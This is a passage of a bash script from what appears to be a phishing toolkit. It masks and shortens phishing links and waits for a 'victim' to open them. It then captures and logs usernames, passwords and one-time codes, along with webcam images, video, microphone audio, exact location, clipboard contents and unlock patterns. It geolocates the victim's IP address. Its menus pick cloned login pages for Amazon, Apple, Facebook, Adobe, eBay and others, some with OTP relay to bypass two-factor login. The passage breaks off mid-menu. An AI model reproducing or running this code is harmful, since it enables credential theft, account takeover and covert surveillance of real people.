check_site() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
shorten() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} SHORTENING URL : ${YELLOW} ${LINK}"
	echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Shortening maytake some time (approx 30 seconds)"
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="
	if [[ $(check_site $isgd) == 2* ]]; then
		shorten_isgd $isgd "$LINK"
	else
		final_isgd_url="${YELLOW} Couldn't shorten this link here"
                masked_isgd_url="${YELLOW} Couldn't mask this link here"
	fi
	if [[ $(check_site $shortcode) == 2* ]]; then
		shorten_shortcode $shortcode "$LINK"
	else
		final_shortcode_url1="${YELLOW} Couldn't shorten this link here"
                masked_shortcode_url1="${YELLOW} Couldn't mask this link here"
		final_shortcode_url2="${YELLOW} Couldn't shorten this link here"
                masked_shortcode_url2="${YELLOW} Couldn't mask this link here"
		final_shortcode_url3="${YELLOW} Couldn't shorten this link here"
                masked_shortcode_url3="${YELLOW} Couldn't mask this link here"
	fi
	if [[ $(check_site $tinyurl) == 2* ]]; then
		shorten_tinyurl $tinyurl "$LINK"
	else
		final_tinyurl_url="${YELLOW} Couldn't shorten this link here"
                masked_tinyurl_url="${YELLOW} Couldn't mask this link here"
	fi
	displayshortlink
}
shorten_isgd() {
	link_isgd=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	processed_isgd_url=${link_isgd#http*//}
	final_isgd_url="https://$processed_isgd_url"
	masked_isgd_url="${CUS_URL}-${Keystks}@$processed_isgd_url"
}
shorten_shortcode() {
	link_shortcode=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	processed_shortcode_url1=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url1="https://$processed_shortcode_url1"
	masked_shortcode_url1="${CUS_URL}-${Keystks}@$processed_shortcode_url1"
	processed_shortcode_url2=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url2="https://$processed_shortcode_url2"
	masked_shortcode_url2="${CUS_URL}-${Keystks}@$processed_shortcode_url2"
	processed_shortcode_url3=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	final_shortcode_url3="https://$processed_shortcode_url3"
	masked_shortcode_url3="${CUS_URL}-${Keystks}@$processed_shortcode_url3"
}
shorten_tinyurl() {
	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [ $link_tinyurl=="" ]; then
		processed_tinyurl_url="${YELLOW} Couldn't shorten this link here"
		final_tinyurl_url="${YELLOW} Couldn't shorten this link here"
		masked_tinyurl_url="${YELLOW} Couldn't mask this link here"
	else
		processed_tinyurl_url=${link_tinyurl#http*//}
		final_tinyurl_url="https://$processed_tinyurl_url"
		masked_tinyurl_url="${CUS_URL}-${Keystks}@$processed_tinyurl_url"
	fi
}

## Display link
displaylocalhost(){
        status_display
        echo -ne "\n${RED}[${WHITE}-${RED}]${CYAN} LOGS NAME : ${WHITE}${final_log_name}${NA}"
	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} LOCALHOST URL : ${WHITE}http://${HOST}:${PORT} ${NA}"        
}
displaylink(){
	displaylocalhost
	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} ORIGINAL URL  : ${GREEN}${LINK}"
}
displayshortlink() {
	displaylink
	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 3 : ${GREEN}${final_shortcode_url2}"
	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 4 : ${GREEN}${final_shortcode_url3}"
	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
	capture_data_check
}

#Capture data check
capture_data_check(){
        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Victim to open the link, ${MAGENTA}Ctrl + C ${YELLOW}to exit..."
        mkdir ${final_log_dir}
        touch ${final_log_name}
	if [ ${capture_type}="NOTP" ];then
                capture_data_notp
        elif [ ${capture_type}="OOTP" ];then
                capture_data_ootp
        elif [ ${capture_type}="POTP" ];then
                capture_data_potp
        elif [ ${capture_type}="IMG" ];then
                capture_img
        elif [ ${capture_type}="VID" ];then
                capture_vid
        elif [ ${capture_type}="MIC" ];then
                capture_mic
        elif [ ${capture_type}="LOC" ];then
                capture_loc
        elif [ ${capture_type}="CLIP" ];then
                capture_clip
        elif [ ${capture_type}="PAT" ];then
                capture_pat
        elif [ ${capture_type}="IP" ];then
                capture_ip
	else
		echo -e " Error Occured in capturing data!!"
        fi
# NOTP - id pass
# OOTP - id otp
# POTP - id pass otp
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' ${www_dir}/ip.txt | cut -d " " -f2 | tr -d '\r')
##	IP=$(awk -F 'IP: ' '{print $2}' ${www_dir}/ip.txt | xargs)
	victim_ip=${IP}
	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM IP : ${BOLDWHITE}${victim_ip}${NA}"
        cat ${dumps_dir}/space.txt >> ${final_log_name}
	cat ${dumps_dir}/line.txt >> ${final_log_name}
        cat ${dumps_dir}/space.txt >> ${final_log_name}
	cat ${www_dir}/ip.txt >> ${final_log_name}
	echo -ne "\n${CYAN}Saved IP address in Logs"
	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
		echo -ne "${RED} IP details cannot be captured in localhost server"
	else
		ip_details $IP
	fi
	rm -rf ${www_dir}/ip.txt
        if [ -f "${www_dir}/device.txt" ]; then
                echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM DEVICE DETAILS : ${RESETBG} ${BOLDWHITE}"
                cat ${www_dir}/device.txt 
                echo -e "${NA}"
	        cat ${dumps_dir}/space.txt >> ${final_log_name}
                cat ${dumps_dir}/line.txt >> ${final_log_name}
                cat ${dumps_dir}/space.txt >> ${final_log_name}
                cat ${www_dir}/device.txt >> ${final_log_name}
                echo -ne "\n${CYAN}Saved device details in Logs"
	fi

}
ip_details() {
	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} Trying to capture details of IP : ${RESETBG} ${victim_ip}${NA}"
##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
	wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
	sleep 2
	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
	iptt=$(sed -n 's/"ip"://p' track.txt)
	if [[ $iptt != "" ]]; then
		echo -e  "\n${GREEN} Device ip: ${BOLDWHITE} $iptt"
	fi
	ipstats=$(sed -n 's/"success"://p' track.txt)
	if [[ $ipsuccess != "" ]]; then
                echo -e  "\n${GREEN} IP details capturing: ${BOLDWHITE} $iptt"
        fi
	iptype=$(sed -n 's/"type"://p' track.txt)
	if [[ $iptype != "" ]]; then
		echo -e "${GREEN} IP type: ${BOLDWHITE} $iptype"
	fi
	latitude=$(sed -n 's/"latitude"://p' track.txt)
	if [[ $latitude != "" ]]; then
		echo -e  "${GREEN} Latitude:  ${BOLDWHITE} $latitude"
	fi
	longitude=$(sed -n 's/"longitude"://p' track.txt)
	if [[ $longitude != "" ]]; then
		echo -e  "${GREEN} Longitude:  ${BOLDWHITE} $longitude"
	fi
	city=$(sed -n 's/"city"://p' track.txt)
	if [[ $city != "" ]]; then
		echo -e "${GREEN} City: ${BOLDWHITE} $city"
	fi
	isp=$(sed -n 's/"isp"://p' track.txt)
	if [[ $isp != "" ]]; then
		echo -e "${GREEN} Isp: ${BOLDWHITE} $isp"
	fi
	country=$(sed -n 's/"country"://p' track.txt)
	if [[ $country != "" ]]; then
		echo -e  "${GREEN} Country: ${BOLDWHITE} $country"
	fi
	flag=$(sed -n 's/"country_flag"://p' track.txt)
	if [[ $flag != "" ]]; then
		echo -e "${GREEN} Country flag: ${BOLDWHITE} $flag"
	fi
	cap=$(sed -n 's/"country_capital"://p' track.txt)
	if [[ $cap != "" ]]; then
		echo -e "${GREEN} Country capital: ${BOLDWHITE} $cap"
	fi
	phon=$(sed -n 's/"country_phone"://p' track.txt)
	if [[ $phon != "" ]]; then
		echo -e "${GREEN} Country code: ${BOLDWHITE} $phon"
	fi
	continent=$(sed -n 's/"continent"://p' track.txt)
	if [[ $continent != "" ]]; then
		echo -e  "${GREEN} Continent:  ${BOLDWHITE} $continent"
	fi
	ccode=$(sed -n 's/"currency_code"://p' track.txt)
	if [[ $ccode != "" ]]; then
		echo -e "${GREEN} Currency code: ${BOLDWHITE} $ccode"
	fi
	region=$(sed -n 's/"region"://p' track.txt)
	if [[ $region != "" ]]; then
		echo -e "${GREEN} State: ${BOLDWHITE} $region"
	fi
	cat ${dumps_dir}/space.txt >> ${final_log_name}
        cat ${dumps_dir}/line.txt >> ${final_log_name}
	cat ${dumps_dir}/space.txt >> ${final_log_name}
	cat track.txt >> "${final_log_name}"
        echo -ne "\n${CYAN}Saved track details in Logs"
	rm -rf track.txt
	rm -rf rawtrack.txt
}

## Get credentials
capture_id() {
        victim_id=$( cat ${www_dir}/usernames.txt)
        echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM USERNAME : ${RESETBG}${NA}"
	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_id}${RESETBG}${NA}"
        echo -ne "\n${CYAN}Saved in Logs"
	cat ${dumps_dir}/space.txt >> ${final_log_name}
        cat ${dumps_dir}/line.txt >> ${final_log_name}
	cat ${dumps_dir}/space.txt >> ${final_log_name}
        cat ${www_dir}/usernames.txt >> ${final_log_name}
	rm -rf ${www_dir}/usernames.txt
}
capture_pass() {
	victim_pass=$( cat "${www_dir}/pass.txt")
	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM PASSWORD : ${RESETBG}${NA}"
	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_pass}${RESETBG}${NA}"
        echo -ne "\n${CYAN}Saved in Logs"
	cat ${dumps_dir}/space.txt >> ${final_log_name}
        cat ${dumps_dir}/line.txt >> ${final_log_name}
	cat ${dumps_dir}/space.txt >> ${final_log_name}
        cat ${www_dir}/pass.txt >> ${final_log_name}
	rm -rf ${www_dir}/pass.txt
}
capture_otp() {
	victim_otp=$( cat "${www_dir}/otp.txt")
	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM OTP : ${RESETBG}${NA}"
	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_otp}${RESETBG}${NA}"
        echo -ne "\n${CYAN}Saved in Logs"
	cat ${dumps_dir}/space.txt >> ${final_log_name}
        cat ${dumps_dir}/line.txt >> ${final_log_name}
	cat ${dumps_dir}/space.txt >> ${final_log_name}
        cat ${www_dir}/otp.txt >> ${final_log_name}
	rm -rf ${www_dir}/otp.txt
}
capture_img(){
        while true; do
            if [[ -e "${www_dir}/ip.txt" ]]; then
                capture_ip
            fi
                sleep 0.75
        	if [[ -e "${www_dir}/Log.log" ]]; then
			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
	       		printf "\n${GREEN} Image file received! ${NC}"
			echo -ne " "
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${dumps_dir}/line.txt >> ${final_log_name}
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${www_dir}/Log.log >> ${final_log_name}
              	        rm -rf ${www_dir}/Log.log
       		       	mv ${www_dir}/*.png  "${final_log_dir}/clifty-img-${filename}.png"
                        echo -ne "\n${CYAN}Saved in Logs"
            fi
                sleep 0.5
	done
}
capture_vid(){
        while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        capture_ip
                fi
                sleep 0.75
		if [[ -e "${www_dir}/Log.log" ]]; then
			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
                        printf "\n${GREEN} Video file received! ${NC}"
			echo -ne " "
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${dumps_dir}/line.txt >> ${final_log_name}
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${www_dir}/Log.log >> ${final_log_name}
                        mv ${www_dir}/*.webm  "${final_log_dir}/clifty-video-${filename}.webm"
                        echo -ne "\n${CYAN}Saved in Logs"
                fi
                sleep 0.5
	done
}
capture_mic(){
        while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        capture_ip
                fi
                sleep 0.75
		if [[ -e "${www_dir}/Log.log" ]]; then
			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
                        printf "\n${GREEN} Audio file received! ${NC}"
			echo -ne " " 
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${dumps_dir}/line.txt >> ${final_log_name}
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${www_dir}/Log.log >> ${final_log_name}
			rm -rf ${www_dir}/Log.log
                        mv ${www_dir}/*.wav  "${final_log_dir}/clifty-audio-${filename}.wav"
                        echo -ne "\n${CYAN}Saved in Logs"
                fi
                sleep 0.5
	done
}
capture_loc(){
        while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        capture_ip
                fi
                sleep 0.75
		if [[ -e "${www_dir}/location.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM EXACT LOCATION DETAILS : ${RESETBG} ${BOLDWHITE}"
                        cat ${www_dir}/location.txt 
			echo -ne " " 
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${dumps_dir}/line.txt >> ${final_log_name}
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${www_dir}/location.txt >> ${final_log_name}
                        mv ${www_dir}/location.txt  "${final_log_dir}"
                        echo -ne "\n${CYAN}Saved in Logs"
                fi
                sleep 0.5
	done
}
capture_clip(){
        while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        capture_ip
                fi
                sleep 0.75
		if [[ -e "${www_dir}/clipboard.txt" ]]; then
                        echo -e "\n${MAGENTABG} ${BOLDWHITE}"
                        cat ${www_dir}/clipboard.txt 
			echo -ne "${NA}" 
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${dumps_dir}/line.txt >> ${final_log_name}
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${www_dir}/clipboard.txt >> ${final_log_name}
                        mv ${www_dir}/clipboard.txt  "${final_log_dir}"
                        echo -ne "\n${CYAN}Saved in Logs"
                fi
                sleep 0.5
	done
}
capture_pat(){
        while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        capture_ip
                fi
                sleep 0.75
		if [[ -e "${www_dir}/pattern.txt" ]]; then
                        echo -e "\n${MAGENTABG} ${BOLDWHITE}"
                        cat ${www_dir}/pattern.txt 
			echo -ne "${NA}" 
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${dumps_dir}/line.txt >> ${final_log_name}
	                cat ${dumps_dir}/space.txt >> ${final_log_name}
                        cat ${www_dir}/pattern.txt >> ${final_log_name}
                        mv ${www_dir}/pattern.txt  "${final_log_dir}"
                        echo -ne "\n${CYAN}Saved in Logs"
                fi
                sleep 0.5
	done
}
## Print data no otp
capture_data_notp() {  
	while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        capture_ip
                fi
                sleep 0.75
                if [[ -e "${www_dir}/usernames.txt" ]]; then
                        capture_id
			capture_pass
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
                fi
                sleep 0.75
	done
}

## Print data otp
capture_data_ootp() {
	while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        capture_ip
                fi
                sleep 0.75
                if [[ -e "${www_dir}/usernames.txt" ]]; then
                        capture_id
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP > "
			echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
                fi
		if [[ -e "${www_dir}/otp.txt" ]]; then
                        capture_otp
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
                fi
                sleep 0.75
	done
}

## Print data notp & otp
capture_data_potp() {
	while true; do
                if [[ -e "${www_dir}/ip.txt" ]]; then
                        capture_ip
                fi
                sleep 0.75
                if [[ -e "${www_dir}/usernames.txt" ]]; then
                        capture_id
			capture_pass
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP >"
                       echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
                fi
		if [[ -e "${www_dir}/otp.txt" ]]; then
			capture_otp
			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
		fi
                sleep 0.75
	done
}

## Tunnel selection
tunnel_menu() {
status_display
echo -e "${ULWHITE}${BOLDWHITE}CHOOSE A TUNNEL TYPE${NF} : ${NC}"
echo -e " "
echo -e "${RED}[${WHITE}01${RED}]${YELLOW} Localhost    ${RED}[${CYAN}For Devs${RED}]"
echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
echo -e "${RED}[${WHITE}04${RED}]${YELLOW} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
echo -e "${NC}"

read -p "${prompt}" tuchoice
        case $tuchoice in
                1 | 01)
                        tunnel_name="LocalHost"
                        tunnel_id="localhost"
                        start_localhost;;
                2 | 02)
                        tunnel_name="Ngrok"
                        tunnel_id="ngrok"
                        check_net_tunnel ${tunnel_id};;
                3 | 03)
                        tunnel_name="Cloudflared"
                        tunnel_id="cloudflared"
                        check_net_tunnel ${tunnel_id};;
		4 | 04)
                        tunnel_name="LocalXpose"
                        tunnel_id="localxpose"
                        check_net_tunnel ${tunnel_id};;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; clear; tunnel_menu; };;
        esac
}

#check internel for tunnel
check_net_tunnel(){
	status
	if [ $plainnetstats == "online" ]; then
		"check_${1}"
	else
		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} Your offline can't start tunneler, ${BOLDGREEN}STARTING LOCALHOST INSTEAD... ${NA}"
		sleep 5
		start_localhost
	fi
}
#WEBSITES
#adobe
login_adobe(){
        site_name="Adobe"
        dgfname="adobe"
        rdurl="www.adobe.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site
        case $reply_site in
                1 | 01)
                        site_id="adobe"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="adobe/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;        
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_adobe; };;
        esac
}
#airtelsim
login_airtelsim(){
        site_id="airtelsim"
        rdurl="www.airtel.in"
        site_name="Airtel Sim"
        site_id="airtelsim"
        capture_type="OOTP"
        site_template="Default"
}
#airtelxstream
login_airtelxstream(){
        site_name="AirtelXStream"
        dgfname="airtelxstream"
        rdurl="www.airtelxstream.in"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="airtelxstream"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="airtelxstream/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_airtelxstream; };;
        esac
}
#ajio
login_ajio(){
        site_name="AJIO"
        dgfname="ajio"
        rdurl="www.ajio.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="ajio"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="ajio/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_ajio; };;
        esac
}
#amazon
login_amazon(){
        site_name="Amazon"
        dgfname="amazon"
        rdurl="www.amazon.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="amazon"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="amazon/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_amazon; };;
        esac
}
#apple
login_apple(){
        site_name="Apple"
        dgfname="apple"
        rdurl="www.apple.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="apple"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="apple/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_apple; };;
        esac
}
#badoo
login_badoo(){
        site_name="Badoo"
        dgfname="badoo"
        rdurl="badoo.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="badoo"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="badoo/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_badoo; };;
        esac
}
#clashofclans
login_clashofclans(){
        site_id="clashofclans"
        rdurl="clashofclans.com/"
        site_name="Clash Of Clans"
        dgfname="clashofclans"
        capture_type="NOTP"
        site_template="Default"
}
#date
login_date(){
        site_name="Date(Multiple phish)"
        rdurl="date.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="date1"
                        dgfname="date1"
                        capture_type="NOTP"
                        site_template="1" ;;
                2 | 02)
                        site_id="date1/otp"
                        capture_type="POTP"
                        dgfname="date1"
                        site_template="1/OTP" ;;
                3 | 03)
                        site_id="date2"
                        dgfname="date2"
                        capture_type="NOTP"
                        site_template="2" ;;
                4 | 04)
                        site_id="date2/otp"
                        capture_type="POTP"
                        dgfname="date2"
                        site_template="2/OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_date; };;
        esac
}
#devianart
login_devianart(){
        site_name="Devian Art"
        dgfname="devianart"
        rdurl="www.deviantart.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="devianart"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="devianart/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_airtelxstream; };;
        esac
}
#dropbox
login_dropbox(){
        site_id="dropbox"
        rdurl="www.dropbox.com/"
        site_name="Drop Box"
        dgfname="dropbox"
        capture_type="NOTP"
        site_template="Default"
}
#ebay
login_ebay(){
        site_name="Ebay"
        dgfname="ebay"
        rdurl="www.ebay.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="ebay"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="ebay/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_ebay; };;
        esac
}
#facebook
login_facebook(){
        site_name="Facebook"
        rdurl="www.facebook.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[04]${CYAN} Facebook Poll - WITH OTP ${NC}"
        echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
        echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
